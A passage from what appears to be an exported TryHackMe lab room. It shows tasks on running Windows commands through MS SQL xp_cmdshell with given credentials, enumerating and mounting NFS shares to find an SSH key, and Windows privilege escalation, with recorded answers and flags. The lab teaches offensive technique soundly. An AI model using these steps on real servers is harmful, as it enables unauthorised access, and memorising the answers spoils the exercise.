<code style=\"font-size:14px\">;</code> indicates the end of the SQL query, while <code style=\"font-size:14px\">go</code> sends a SQL batch to the database.</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Pentester Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P \"t7uLKzddQzVjVFJp\"\n1&gt; SELECT * FROM reindeer.dbo.names;\n2&gt; go\n id          first                                    last                                     nickname\n ----------- ---------------------------------------- ---------------------------------------- ----------------------------------------\n           1 Dasher                                   Dasher                                   Dasher                                  \n           2 Dancer                                   Dancer                                   Dancer                                  \n           3 Prancer                                  Prancer                                  Prancer                                 \n           4 Vixen                                    Vixen                                    Vixen                                   \n           5 Comet                                    Comet                                    Comet                                   \n           6 Cupid                                    Cupid                                    Cupid                                   \n           7 Donner                                   Donder                                   Dunder                                  \n           8 Blitzen                                  Blixem                                   Blitzen                                 \n           9 Rudolph                                  Reindeer                                 Red Nosed\n\n (9 rows affected)</code>\n        </pre></div></div><p>We can see four columns in the table displayed above: id, first (name), last (name), and nickname. What is the first name of the reindeer of id 9?</p>","hint":"The query won't be executed unless you type \"go\" on a separate line and hit the Enter/Return key as shown in the example terminal.","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"Rudolph","noAnswer":false,"answerDesc":"Answer format: *******"},{"question":"<p>Check the table <code style=\"font-size:14px\">schedule</code>. What is the destination of the trip scheduled on December 7?<br /></p>","hint":"You need to execute a query similar to the query displayed in the previous question, but for the table schedule.","questionNo":4,"correct":true,"extraPoints":0,"attempts":1,"submission":"Prague","noAnswer":false,"answerDesc":"Answer format: ******"},{"question":"<p>Check the table <code style=\"font-size:14px\">presents</code>. What is the quantity available for the present “Power Bank”?<br /></p>","hint":"You need to execute a query similar to the query displayed in the previous question, but for the table presents.","questionNo":5,"correct":true,"extraPoints":0,"attempts":1,"submission":"25000","noAnswer":false,"answerDesc":"Answer format: *****"},{"question":"<p>You have done fantastic work! You have helped McDatabaseAdmin retrieve the schedule! Now, let’s see if we can run MS Windows commands while interacting with the database. Some MS SQL Servers have <code style=\"font-size:14px\">xp_cmdshell</code><span style=\"font-size:1rem\"> enabled. If this is the case, we might have access to something similar to a command prompt.</span><br /></p><p></p><p>The command syntax is <code style=\"font-size:14px\">xp_cmdshell 'COMMAND';</code>. Let’s try a simple command, <code style=\"font-size:14px\">whoami</code>, which shows the user running the commands. In the terminal output below, after connecting to MS SQL Server, we tried <code style=\"font-size:14px\">xp_cmdshell 'whoami';</code>, and we can see that the user is <code style=\"font-size:14px\">nt service\\mssqlserver</code>. This means that any command we pass to <code style=\"font-size:14px\">xp_cmdshell</code> will run as <code style=\"font-size:14px\">nt service\\mssqlserver</code>.</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Pentester Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P \"t7uLKzddQzVjVFJp\"\n1&gt; xp_cmdshell 'whoami';\n2&gt; go\n\n\toutput\n\n[...]\n\n\tnt service\\mssqlserver\n    \n\tNULL\n    \n(2 rows affected, return status = 0)</code>\n        </pre></div></div><p>We can run other commands that we can execute on the MS Windows command line. For example, we can use <code style=\"font-size:14px\">dir</code> to list files and directories and <code style=\"font-size:14px\">type filename</code> to display the contents of a file. Consider the example in the terminal window below where we reveal the contents of the text file <code style=\"font-size:14px\">WindowsUpdate.log</code>.</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Pentester Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P \"t7uLKzddQzVjVFJp\"\nsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray\nPortions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp\nThis is free software with ABSOLUTELY NO WARRANTY\nFor more information type '\\warranty'\n1&gt; xp_cmdshell 'type c:\\windows\\WindowsUpdate.log';\n2&gt; go\n\n\toutput\n\t\n[...]\n        \n        Windows Update logs are now generated using ETW (Event Tracing for Windows).\n\tPlease run the Get-WindowsUpdateLog PowerShell command to convert ETW traces into a readable WindowsUpdate.log.\n\n\tNULL\n\t\n\tNULL\n\t\n\tFor more information, please visit https://go.microsoft.com/fwlink/?LinkId=518345 \n(5 rows affected, return status = 0)\n1&gt;</code>\n        </pre></div></div><p>There is a flag hidden in the <code style=\"font-size:14px\">grinch</code> user's home directory. What are its contents?</p>","hint":"Look in directories under C:\\Users\\grinch.","questionNo":6,"correct":true,"extraPoints":0,"attempts":1,"submission":"THM{YjtKeUy2qT3v5dDH}","noAnswer":false,"answerDesc":"Answer format: ***{****************}"},{"question":"<p>Congratulations, the flag you have recovered contains the password of <code style=\"font-size:14px\">McDatabaseAdmin</code>! In this task, we learned how to use <code style=\"font-size:14px\">sqsh</code> to interact with a MS SQL Server. We learned that if <code style=\"font-size:14px\">xp_cmdshell</code> is enabled, we can execute system commands and read the output using <code style=\"font-size:14px\">sqsh</code>.<br /></p>","hint":"","questionNo":7,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"618b8c044ddddd004945dd45","questions":[{"questionNo":1,"question":"<p>You decided that the first step would be to check the running services on <code style=\"font-size:14px\">MACHINE_IP</code>. You resort to yesterday’s tool, Nmap.</p><p>Knowing that <code style=\"font-size:14px\">MACHINE_IP</code> is a MS Windows system, you expect it to not respond to ping probes by default; therefore, you need to add <code style=\"font-size:14px\">-Pn</code> to your <code style=\"font-size:14px\">nmap</code> command to perform the scan. This instructs Nmap to skip pinging the target to see if the host is reachable. Without this option, Nmap will assume the target host is offline and not proceed with scanning.</p><p>There is an open port related to MS SQL Server accessible over the network. What is the port number?</p>","hint":""},{"questionNo":2,"question":"<p>Knowing the MS SQL Server is running and accessible over the network, we want to check if our username and password are still valid. Using the AttackBox terminal, we will use the command <code style=\"font-size:14px\">sqsh</code> (pronounced skwish), an interactive database shell.</p><p>A simple syntax would be <code style=\"font-size:14px\">sqsh -S server -U username -P password</code>, where:</p><ul><li><code style=\"font-size:14px\">-S server</code> is used to specify the server, for example <code style=\"font-size:14px\">-S MACHINE_IP</code></li><li><code style=\"font-size:14px\">-U username</code> is used to provide the username; for example, <code style=\"font-size:14px\">-U sa</code> is the username that we have enabled.</li><li><code style=\"font-size:14px\">-P password</code> lets us specify the password.</li></ul><p>Let’s try to run, <code style=\"font-size:14px\">sqsh -S MACHINE_IP -U sa -P t7uLKzddQzVjVFJp</code></p><p>If the connection is successful, you will get a prompt. What is the prompt that you have received?</p>","hint":""},{"questionNo":3,"question":"<p>McDatabaseAdmin told us the database name is <code style=\"font-size:14px\">reindeer</code> and it has three tables:</p><p></p><ol><li><code style=\"font-size:14px\">names</code></li><li><code style=\"font-size:14px\">presents</code></li><li><code style=\"font-size:14px\">schedule</code></li></ol><p>To display the table <code style=\"font-size:14px\">names</code>, you could use the following syntax, <code style=\"font-size:14px\">SELECT * FROM table_name WHERE condition</code>.</p><ul><li><code style=\"font-size:14px\">SELECT *</code> is used to return specific columns (attributes). <code style=\"font-size:14px\">*</code> refers to all the columns.</li><li><code style=\"font-size:14px\">FROM table_name</code> to specify the table you want to read from.</li><li><code style=\"font-size:14px\">WHERE condition</code> to specify the rows (entities).</li></ul><p>In the terminal below, we executed the query, <code style=\"font-size:14px\">SELECT * FROM reindeer.dbo.names;</code>. This SQL query should dump all the contents of the table <code style=\"font-size:14px\">names</code> from the database <code style=\"font-size:14px\">reindeer</code>. Note that the <code style=\"font-size:14px\">;</code> indicates the end of the SQL query, while <code style=\"font-size:14px\">go</code> sends a SQL batch to the database.</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Pentester Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P \"t7uLKzddQzVjVFJp\"\n1&gt; SELECT * FROM reindeer.dbo.names;\n2&gt; go\n id          first                                    last                                     nickname\n ----------- ---------------------------------------- ---------------------------------------- ----------------------------------------\n           1 Dasher                                   Dasher                                   Dasher                                  \n           2 Dancer                                   Dancer                                   Dancer                                  \n           3 Prancer                                  Prancer                                  Prancer                                 \n           4 Vixen                                    Vixen                                    Vixen                                   \n           5 Comet                                    Comet                                    Comet                                   \n           6 Cupid                                    Cupid                                    Cupid                                   \n           7 Donner                                   Donder                                   Dunder                                  \n           8 Blitzen                                  Blixem                                   Blitzen                                 \n           9 Rudolph                                  Reindeer                                 Red Nosed\n\n (9 rows affected)</code>\n        </pre></div></div><p>We can see four columns in the table displayed above: id, first (name), last (name), and nickname. What is the first name of the reindeer of id 9?</p>","hint":"The query won't be executed unless you type \"go\" on a separate line and hit the Enter/Return key as shown in the example terminal."},{"questionNo":4,"question":"<p>Check the table <code style=\"font-size:14px\">schedule</code>. What is the destination of the trip scheduled on December 7?<br /></p>","hint":"You need to execute a query similar to the query displayed in the previous question, but for the table schedule."},{"questionNo":5,"question":"<p>Check the table <code style=\"font-size:14px\">presents</code>. What is the quantity available for the present “Power Bank”?<br /></p>","hint":"You need to execute a query similar to the query displayed in the previous question, but for the table presents."},{"questionNo":6,"question":"<p>You have done fantastic work! You have helped McDatabaseAdmin retrieve the schedule! Now, let’s see if we can run MS Windows commands while interacting with the database. Some MS SQL Servers have <code style=\"font-size:14px\">xp_cmdshell</code><span style=\"font-size:1rem\"> enabled. If this is the case, we might have access to something similar to a command prompt.</span><br /></p><p></p><p>The command syntax is <code style=\"font-size:14px\">xp_cmdshell 'COMMAND';</code>. Let’s try a simple command, <code style=\"font-size:14px\">whoami</code>, which shows the user running the commands. In the terminal output below, after connecting to MS SQL Server, we tried <code style=\"font-size:14px\">xp_cmdshell 'whoami';</code>, and we can see that the user is <code style=\"font-size:14px\">nt service\\mssqlserver</code>. This means that any command we pass to <code style=\"font-size:14px\">xp_cmdshell</code> will run as <code style=\"font-size:14px\">nt service\\mssqlserver</code>.</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Pentester Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P \"t7uLKzddQzVjVFJp\"\n1&gt; xp_cmdshell 'whoami';\n2&gt; go\n\n\toutput\n\n[...]\n\n\tnt service\\mssqlserver\n    \n\tNULL\n    \n(2 rows affected, return status = 0)</code>\n        </pre></div></div><p>We can run other commands that we can execute on the MS Windows command line. For example, we can use <code style=\"font-size:14px\">dir</code> to list files and directories and <code style=\"font-size:14px\">type filename</code> to display the contents of a file. Consider the example in the terminal window below where we reveal the contents of the text file <code style=\"font-size:14px\">WindowsUpdate.log</code>.</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Pentester Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P \"t7uLKzddQzVjVFJp\"\nsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray\nPortions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp\nThis is free software with ABSOLUTELY NO WARRANTY\nFor more information type '\\warranty'\n1&gt; xp_cmdshell 'type c:\\windows\\WindowsUpdate.log';\n2&gt; go\n\n\toutput\n\t\n[...]\n        \n        Windows Update logs are now generated using ETW (Event Tracing for Windows).\n\tPlease run the Get-WindowsUpdateLog PowerShell command to convert ETW traces into a readable WindowsUpdate.log.\n\n\tNULL\n\t\n\tNULL\n\t\n\tFor more information, please visit https://go.microsoft.com/fwlink/?LinkId=518345 \n(5 rows affected, return status = 0)\n1&gt;</code>\n        </pre></div></div><p>There is a flag hidden in the <code style=\"font-size:14px\">grinch</code> user's home directory. What are its contents?</p>","hint":"Look in directories under C:\\Users\\grinch."},{"questionNo":7,"question":"<p>Congratulations, the flag you have recovered contains the password of <code style=\"font-size:14px\">McDatabaseAdmin</code>! In this task, we learned how to use <code style=\"font-size:14px\">sqsh</code> to interact with a MS SQL Server. We learned that if <code style=\"font-size:14px\">xp_cmdshell</code> is enabled, we can execute system commands and read the output using <code style=\"font-size:14px\">sqsh</code>.<br /></p>","hint":""}]},{"taskTitle":"[Day 12] <span class=\"badge badge-soft-warning size-16\">Networking</span> Sharing Without Caring","taskDesc":"<h2><span style=\"font-size:24px\">Check out Neal Bridges's walkthrough video for day 12 </span><a href=\"https://www.youtube.com/watch?v=BQqjJwFLLII\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><p><br />Before we begin, we suggest that you start the attached Machine and the AttackBox as you will need to use these resources to answer the questions at the end.</p><p>Grinch Enterprises has been leaving traces of how their hackers have been accessing data from the system - you’ve found a unique server they use. We need your help to find out what method they’ve been using to extract any data.</p><p>We have noticed that <code style=\"font-size:14px\">MACHINE_IP</code> is generating unusual traffic. We highly suspect that Grinch Enterprises are using it to access our data. We will use Nmap to discover the services are running on their server.</p><p align=\"center\"><br /></p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/20b551ee6ff7b4767153989c16f2d3fc.png\" style=\"width:807px\" /></p>","taskType":"vm","taskNo":17,"taskCreated":"2021-11-16T13:45:26.237Z","taskDeadline":null,"tasksInfo":[{"question":"Scan the target server with the IP <code style=\"font-size:14px\">MACHINE_IP</code>. Remember that MS Windows hosts block pings by default, so we need to add <code style=\"font-size:14px\">-Pn</code>, for example, <code style=\"font-size:14px\">nmap -Pn MACHINE_IP</code> for the scan to work correctly. How many TCP ports are open?","hint":"Run on the AttackBox terminal: nmap -Pn MACHINE_IP","questionNo":1,"correct":true,"extraPoints":0,"attempts":1,"submission":"7","noAnswer":false,"answerDesc":"Answer format: *"},{"question":"<p>Network File System (NFS) is a protocol that allows the ability to transfer files between different computers and is available on many systems, including MS Windows and Linux. Consequently, NFS makes it easy to share files between various operating systems<span style=\"font-size:1rem\">.</span><br /></p><p>In the scan results you received earlier, you should be able to spot NFS or mountd, depending on whether you used the <code style=\"font-size:14px\">-sV</code> option with Nmap or not. Which port is detected by Nmap as NFS or using the mountd service?</p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":1,"submission":"2049","noAnswer":false,"answerDesc":"Answer format: ****"},{"question":"<p>Now that we have discovered an NFS service is listening, let’s check what files are being shared. We can do this using the command <code>showmount</code>. In the terminal below, we run <code>showmount -e MACHINE_IP</code>. The <code>-e</code> or <code>--exports</code> show the NFS server’s export list.</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Pentester Terminal\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">pentester@TryHackMe$ showmount -e MACHINE_IP\nExport list for MACHINE_IP:\n/share        (everyone)\n/my-notes     (noone)</code>\n        </pre>\n    </div>\n</div>\n\n<p>As we can see in the terminal output above, we have two shares, <code>/share</code> and <code>/my-notes</code>. After you have started the attached machine, use the AttackBox terminal to discover the shares on <code>MACHINE_IP</code>.</p>\n<p>How many shares did you find?</p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"4","noAnswer":false,"answerDesc":"Answer format: *"},{"question":"<p>How many shares show “everyone”?<br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":1,"submission":"3","noAnswer":false,"answerDesc":"Answer format: *"},{"question":"<p>Let’s try to mount the shares we have discovered. We can create a directory on the AttackBox using <code>mkdir tmp1</code>, where <code>tmp1</code> is the directory’s name. Then we can use this directory  we created to mount the public NFS share using: <code>mount MACHINE_IP:/my-notes tmp1</code>.</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Pentester Terminal\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">pentester@TryHackMe$ mount MACHINE_IP:/my-notes tmp1\nmount.nfs: access denied by server while mounting MACHINE_IP:/my-notes</code>\n        </pre>\n    </div>\n</div>\n\n<p>We can see that the mounting has failed. <code>my-notes</code> is not public and requires specific authentication mechanisms that we don’t have access to. Let’s try again with the other folder, <code>share</code>.</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Pentester Terminal\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">pentester@TryHackMe$ mount MACHINE_IP:/share tmp1</code>\n        </pre>\n    </div>\n</div>\n\n<p>We didn’t get any error messages, so it was a success. Let’s go inside the share to see what’s inside it using <code>cd tmp1</code>, then <code>ls</code>.</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Pentester Terminal\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">pentester@TryHackMe$ ls\n132-0.txt  2680-0.txt</code>\n        </pre>\n    </div>\n</div>\n\n<p>There are two text files. We can open the file using any text editor such as <code>nano FILENAME</code> or something quicker such as <code>less FILENAME</code>.</p>\n<p>What is the title of file 2680-0.txt?</p>","hint":"head 2680-0.txt","questionNo":5,"correct":true,"extraPoints":0,"attempts":1,"submission":"Meditations","noAnswer":false,"answerDesc":"Answer format: ***********"},{"question":"<p>It seems that Grinch Enterprises has forgotten their SSH keys on our system. One of the shares contains a private key used for SSH authentication (<code style=\"font-size:14px\">id_rsa</code>). What is the name of the share?<br /></p>","hint":"","questionNo":6,"correct":true,"extraPoints":0,"attempts":1,"submission":"confidential","noAnswer":false,"answerDesc":"Answer format: ************"},{"question":"<p>We can calculate the MD5 sum of a file using <code style=\"font-size:14px\">md5sum FILENAME</code>. What is the MD5 sum of <code style=\"font-size:14px\">id_rsa</code>?<br /></p>","hint":"","questionNo":7,"correct":true,"extraPoints":0,"attempts":2,"submission":"3e2d315a38f377f304f5598dc2f044de","noAnswer":false,"answerDesc":"Answer format: ********************************"}],"uploadId":"618b8c1b3da691005f49147a","questions":[{"questionNo":1,"question":"Scan the target server with the IP <code style=\"font-size:14px\">MACHINE_IP</code>. Remember that MS Windows hosts block pings by default, so we need to add <code style=\"font-size:14px\">-Pn</code>, for example, <code style=\"font-size:14px\">nmap -Pn MACHINE_IP</code> for the scan to work correctly. How many TCP ports are open?","hint":"Run on the AttackBox terminal: nmap -Pn MACHINE_IP"},{"questionNo":2,"question":"<p>Network File System (NFS) is a protocol that allows the ability to transfer files between different computers and is available on many systems, including MS Windows and Linux. Consequently, NFS makes it easy to share files between various operating systems<span style=\"font-size:1rem\">.</span><br /></p><p>In the scan results you received earlier, you should be able to spot NFS or mountd, depending on whether you used the <code style=\"font-size:14px\">-sV</code> option with Nmap or not. Which port is detected by Nmap as NFS or using the mountd service?</p>","hint":""},{"questionNo":3,"question":"<p>Now that we have discovered an NFS service is listening, let’s check what files are being shared. We can do this using the command <code>showmount</code>. In the terminal below, we run <code>showmount -e MACHINE_IP</code>. The <code>-e</code> or <code>--exports</code> show the NFS server’s export list.</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Pentester Terminal\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">pentester@TryHackMe$ showmount -e MACHINE_IP\nExport list for MACHINE_IP:\n/share        (everyone)\n/my-notes     (noone)</code>\n        </pre>\n    </div>\n</div>\n\n<p>As we can see in the terminal output above, we have two shares, <code>/share</code> and <code>/my-notes</code>. After you have started the attached machine, use the AttackBox terminal to discover the shares on <code>MACHINE_IP</code>.</p>\n<p>How many shares did you find?</p>","hint":""},{"questionNo":4,"question":"<p>How many shares show “everyone”?<br /></p>","hint":""},{"questionNo":5,"question":"<p>Let’s try to mount the shares we have discovered. We can create a directory on the AttackBox using <code>mkdir tmp1</code>, where <code>tmp1</code> is the directory’s name. Then we can use this directory  we created to mount the public NFS share using: <code>mount MACHINE_IP:/my-notes tmp1</code>.</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Pentester Terminal\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">pentester@TryHackMe$ mount MACHINE_IP:/my-notes tmp1\nmount.nfs: access denied by server while mounting MACHINE_IP:/my-notes</code>\n        </pre>\n    </div>\n</div>\n\n<p>We can see that the mounting has failed. <code>my-notes</code> is not public and requires specific authentication mechanisms that we don’t have access to. Let’s try again with the other folder, <code>share</code>.</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Pentester Terminal\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">pentester@TryHackMe$ mount MACHINE_IP:/share tmp1</code>\n        </pre>\n    </div>\n</div>\n\n<p>We didn’t get any error messages, so it was a success. Let’s go inside the share to see what’s inside it using <code>cd tmp1</code>, then <code>ls</code>.</p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Pentester Terminal\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">pentester@TryHackMe$ ls\n132-0.txt  2680-0.txt</code>\n        </pre>\n    </div>\n</div>\n\n<p>There are two text files. We can open the file using any text editor such as <code>nano FILENAME</code> or something quicker such as <code>less FILENAME</code>.</p>\n<p>What is the title of file 2680-0.txt?</p>","hint":"head 2680-0.txt"},{"questionNo":6,"question":"<p>It seems that Grinch Enterprises has forgotten their SSH keys on our system. One of the shares contains a private key used for SSH authentication (<code style=\"font-size:14px\">id_rsa</code>). What is the name of the share?<br /></p>","hint":""},{"questionNo":7,"question":"<p>We can calculate the MD5 sum of a file using <code style=\"font-size:14px\">md5sum FILENAME</code>. What is the MD5 sum of <code style=\"font-size:14px\">id_rsa</code>?<br /></p>","hint":""}]},{"taskTitle":"[Day 13] <span class=\"badge badge-soft-warning size-16\">Networking</span> They Lost The Plan!","taskDesc":"<p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"font-weight:bolder;color:rgb(33, 37, 41)\"><span style=\"font-size:24px\">Story</span></span><br /></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">McSkidy has realized that she worked on a rough draft of a disaster recovery plan but locked down the permissions on the file to ensure that it was safe. However, the Grinch accessed the local system and reduced the permissions of her account. Can you elevate her privileges and get the file back?</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><br /></span></p><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Learning Objectives</span></span></p><ol><li>Understanding different types of user privileges in Windows<br /></li><li>Different privilege escalation techniques<br /></li><li>Exploiting a privilege escalation vulnerability</li></ol><h2><span style=\"font-size:24px\">Check out HuskyHacks' walkthrough video for day 13 </span><a href=\"https://www.youtube.com/watch?v=zIR7Is90N30\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><hr style=\"border:1px solid var(--main-color)\" /><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Before you begin, please start the target machine. You can use in-browser access or connect to it over RDP using the credentials below.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><br /></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"font-weight:bolder\">Username:</span> mcskidy</p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"font-weight:bolder\">Password:</span> Password1<br /></p><p align=\"center\" style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/51333ad8cdaade3fcd23986dbd235b5c.png\" style=\"width:269px\" /><br /></p><p align=\"center\" style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"font-weight:bolder\"><span style=\"background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt;font-size:24px\">Privileges</span></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">McSkidy made the right decision; any malicious hacker's life is easier once they connect to a system with privileged accounts. A privileged account (such as Administrator on Windows systems or Root on Linux systems) will allow them to access any file on the system and make any changes they need. An account with a lower privilege can make things more difficult.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">The Grinch has a pretty good understanding of cyber security. Restricting McSkidy's account privileges makes the incident response process more difficult. She may need to run tools or remove any malicious account the Grinch may have created, but an account with restricted privileges will make this impossible.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">On a typical Windows server, you may find several different account types; these are summarized below.</span></p><ul><li style=\"color:rgb(14, 16, 26);background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Domain Administrators: This is typically the highest account level you will find in an enterprise along with Enterprise Administrators. An account with this level of privilege can manage all accounts of the organization, their access levels, and almost anything you can think of. A \"domain\" is a central registry used to manage all users and computers within the organization.</span></li><li style=\"color:rgb(14, 16, 26);background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Services: Accounts used by software to perform their tasks such as back-ups or antivirus scans.</span></li><li style=\"color:rgb(14, 16, 26);background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Domain users: Accounts typically used by employees. These should have just enough privileges to do their daily jobs. For example, a system administrator may restrict a user's ability to install and uninstall software.</span></li><li style=\"color:rgb(14, 16, 26);background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Local accounts: These accounts are only valid on the local system and can not be used over the domain.</span></li></ul><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Accounts can be easily managed with groups. For example, the McSkidy account can be created as a regular user and be later added to the Domain Administrators group, giving it Domain Administrator privileges.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"font-weight:bolder\"><span style=\"background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt;font-size:24px\">Windows Privilege Escalation Vectors</span></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">A few common vectors that could allow any user to increase their privilege levels on a Windows system are listed below.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><ul style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><li style=\"background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Stored Credentials: Important credentials can be saved in files by the user or in the configuration file of an application installed on the target system.</span></li><li style=\"background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Windows Kernel Exploit: The Windows operating system installed on the target system can have a known vulnerability that can be exploited to increase privilege levels.</span></li><li style=\"background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Insecure File/Folder Permissions: In some situations, even a low privileged user can have read or write privileges over files and folders that can contain sensitive information.</span></li><li style=\"background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Insecure Service Permissions: Similar to permissions over sensitive files and folders, low privileged users may have rights over services. These can be somewhat harmless such as querying the service status (SERVICE_QUERY_STATUS) or more interesting rights such as starting and stopping a service (SERVICE_START and SERVICE_STOP, respectively).</span></li><li style=\"background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">DLL Hijacking: Applications use DLL files to support their execution. You can think of these as smaller applications that can be launched by the main application. Sometimes DLLs that are deleted or not present on the system are called by the application. This error 